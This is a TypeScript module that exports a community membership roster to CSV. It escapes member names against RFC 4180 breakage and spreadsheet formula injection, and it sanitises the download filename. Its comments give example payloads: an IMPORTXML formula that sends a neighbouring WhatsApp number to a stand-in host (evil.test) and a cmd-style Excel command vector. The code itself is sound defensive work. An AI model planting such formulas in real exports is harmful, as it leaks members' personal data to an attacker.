/**
 * THE MEMBER ROSTER AS A CSV FILE, and the escaping that makes it safe.
 *
 * ESCAPING HERE IS A CORRECTNESS REQUIREMENT, NOT POLISH. A member types their own
 * display name at checkout, so this module takes UNTRUSTED INPUT and writes it into
 * a file that opens in the creator's Excel or Google Sheets — next to a column of
 * other members' WhatsApp numbers. Two independent things can go wrong and both are
 * handled below:
 *
 *   1. STRUCTURE (RFC 4180). A comma splits one member across two columns and shifts
 *      every later column of that row. A double quote ends the field early. A newline
 *      turns one member into two rows, the second malformed. All three are silent:
 *      the file opens, and one row of it is wrong.
 *
 *   2. EXECUTION (formula injection). Excel and Google Sheets EVALUATE a cell whose
 *      first character is `=`, `+`, `-`, `@`, a tab or a carriage return. So a display
 *      name of `=HYPERLINK("http://evil.test","klik")` is a live link in the
 *      creator's spreadsheet, and `=IMPORTXML("http://evil.test/?"&B2)` exfiltrates
 *      the WhatsApp number in the next column to whoever chose that name. This is
 *      not theoretical for us specifically: the name is free text a payer supplies,
 *      and the file's only reader is the creator, on their own machine.
 *
 * PURE, and it imports nothing, so every case above is testable as a string.
 */

/**
 * A roster row, as the CSV writer needs it. Structurally satisfied by
 * `MemberRosterRow` in the analytics port — declared here rather than imported so
 * this module stays free of application types.
 */
export interface MemberCsvRow {
  name: string | null;
  whatsappNumber: string;
  tierName: string;
  status: string;
  joinedAt: Date;
  nextBillingDate: string | null;
}

/**
 * The column headings, in Indonesian and in file order.
 *
 * `Tagihan berikutnya` is LAST and `Nama` FIRST deliberately: a creator scanning the
 * file reads the person, then how to reach them, then what they bought. `member.id`
 * is NOT a column — the roster JSON carries it because the revoke action needs it,
 * but a uuid in a spreadsheet is a column of noise for a human reader.
 */
export const MEMBER_CSV_COLUMNS = [
  "Nama",
  "Nomor WhatsApp",
  "Paket",
  "Status",
  "Bergabung",
  "Tagihan berikutnya",
] as const;

/**
 * Characters a spreadsheet reads as "this cell is a formula" when they come FIRST.
 *
 * `-` is in here even though a negative number is harmless, because `-2+3+cmd|…` is
 * a documented Excel command-execution vector and no member's display name
 * legitimately begins with a minus. Tab and carriage return are in here because
 * Excel strips leading whitespace before deciding, so `\t=1+1` is a formula.
 */
const FORMULA_LEADERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

/** Characters that force RFC 4180 quoting. */
const MUST_QUOTE = [",", '"', "\n", "\r"];

/**
 * One CSV field: quoted when it has to be, and defused when a spreadsheet would
 * otherwise execute it.
 *
 * THE ORDER OF THE TWO RULES MATTERS. The formula prefix is added FIRST and the
 * whole thing is quoted afterwards, so a value that needs both — `=SUM(A1,A2)`,
 * which is a formula AND contains a comma — comes out as `"'=SUM(A1,A2)"` rather
 * than as a quoted formula that Excel still evaluates.
 *
 * THE PREFIX IS A SINGLE QUOTE (the OWASP mitigation). Excel does not treat a
 * leading apostrophe read FROM A CSV as an escape character, so it stays visible in
 * the cell — a small cosmetic cost — but the cell no longer BEGINS with `=`, so it
 * is text and is never evaluated. Not added when the value already begins with an
 * apostrophe: it is already text, and a second one would look to the reader like
 * part of the name.
 *
 * Leading and trailing spaces force quoting too, so a name of `"  Siti  "` is not
 * silently trimmed by a reader that strips unquoted whitespace.
 */
export function escapeCsvField(value: string): string {
  const first = value.slice(0, 1);
  const dangerous = FORMULA_LEADERS.has(first);
  const body = dangerous ? `'${value}` : value;

  const needsQuoting =
    dangerous ||
    MUST_QUOTE.some((char) => body.includes(char)) ||
    body !== body.trim();

  if (!needsQuoting) return body;
  // RFC 4180 §2.7: a double quote inside a quoted field is written twice.
  return `"${body.replace(/"/g, '""')}"`;
}

/** The header record. No terminator — the writer joins the lines. */
export function memberCsvHeaderLine(): string {
  return MEMBER_CSV_COLUMNS.map(escapeCsvField).join(",");
}

/**
 * One member record. No terminator, for the same reason as the header: a caller that
 * appended one per line would emit a trailing blank record, which several readers
 * present as an empty member.
 *
 * `joinedAt` is rendered as a FULL ISO INSTANT rather than a calendar date. It is a
 * `timestamptz`, and rendering only the date would have to pick a timezone: in UTC, a
 * member who joined at 05:00 Jakarta would be filed under the previous day. An
 * instant is unambiguous, sorts correctly as text, and every spreadsheet parses it.
 *
 * `null` becomes an EMPTY field, never the word "null" — `member.name` is nullable
 * (checkout can create a member without one) and a cell reading `null` makes a
 * creator think that is what somebody typed.
 */
export function memberCsvLine(row: MemberCsvRow): string {
  return [
    row.name ?? "",
    row.whatsappNumber,
    row.tierName,
    row.status,
    row.joinedAt.toISOString(),
    row.nextBillingDate ?? "",
  ]
    .map(escapeCsvField)
    .join(",");
}

/** RFC 4180 §2.1: records are terminated by CRLF. */
export const CSV_LINE_TERMINATOR = "\r\n";

/**
 * A UTF-8 byte-order mark, emitted before the header.
 *
 * Excel on Windows reads a BOM-less UTF-8 CSV as the system code page, so an
 * Indonesian member called `Nurul Aisyah` survives but one called `Müller` becomes
 * `MÃ¼ller`. Nothing in this file is ASCII-only by construction — the name is free
 * text — so the BOM is the difference between a correct export and a subtly
 * corrupted one. Every modern reader ignores it.
 */
export const CSV_BOM = "﻿";

/**
 * Everything in a slug that is allowed into a filename. Slugs are `[a-z0-9-]` by
 * construction (`domain/slug.ts`), so this is defence in depth — but a
 * `Content-Disposition` value is exactly the wrong place to trust a construction
 * argument, because a quote or a CRLF in it is header injection.
 */
const FILENAME_SAFE = /[^a-z0-9-]+/gi;

/** Used when a slug sanitises away to nothing, so the download still has a name. */
const FALLBACK_SLUG = "komunitas";

/**
 * The `filename` for `Content-Disposition: attachment`, including the community
 * slug so a creator with three communities can tell three downloads apart.
 */
export function csvAttachmentFilename(communitySlug: string): string {
  const safe = communitySlug.replace(FILENAME_SAFE, "").slice(0, 80);
  return `anggota-${safe === "" ? FALLBACK_SLUG : safe}.csv`;
}
